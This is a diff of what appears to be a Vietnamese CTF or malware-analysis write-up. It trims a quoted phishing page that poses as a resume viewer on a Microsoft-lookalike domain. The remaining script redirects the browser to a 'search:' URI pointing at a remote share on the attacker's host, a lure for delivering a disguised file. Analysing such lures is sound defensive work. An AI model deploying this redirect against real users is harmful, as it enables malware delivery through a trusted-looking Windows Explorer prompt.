@@ -67,39 +67,9 @@ Truy cập http://storage.microsoftcloudservices.com:[PORT]//index.php
 Xem source, chú ý đến đoạn sau
 
 ```html
-<body>
-<div id="loading" class="loading-screen">Loading, please wait...</div>
-  
-  <div class="background">
-    <div class="resume-preview">
-      <h1>John Doe</h1>
-      <p>Software Engineer | Web Developer | UI/UX Designer</p>
-      
-      <h2>Professional Experience</h2>
-      <h3>Senior Software Engineer - Tech Corp</h3>
-      <p>Led development of scalable web applications using modern technologies...</p>
-      
-      <h2>Education</h2>
-      <p>B.S. Computer Science - University of Technology</p>
-      
-      <h2>Skills</h2>
-      <p>JavaScript, React, Node.js, Python, AWS, Docker...</p>
-      
-      <h2>Projects</h2>
-      <p>E-commerce Platform: Developed full-stack solution...</p>
-      
-      <h2>Contact</h2>
-      <p>Email: john.doe@email.com</p>
-      <p>LinkedIn: linkedin.com/in/johndoe</p>
-    </div>
-  </div>
-  
   <div class="blur-overlay">
     <button class="view-button" onclick="getResume()">View Full Resume</button>
   </div>
-
-
-
   <script defer="defer">
     setTimeout(() => {
       document.getElementById('loading').style.display = 'none';
@@ -110,5 +80,4 @@ Xem source, chú ý đến đoạn sau
       window.location.href=`search:displayname=Downloads&subquery=\\\\${window.location.hostname}@${window.location.port}\\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\`;
     }
   </script>
-</body>
 ```
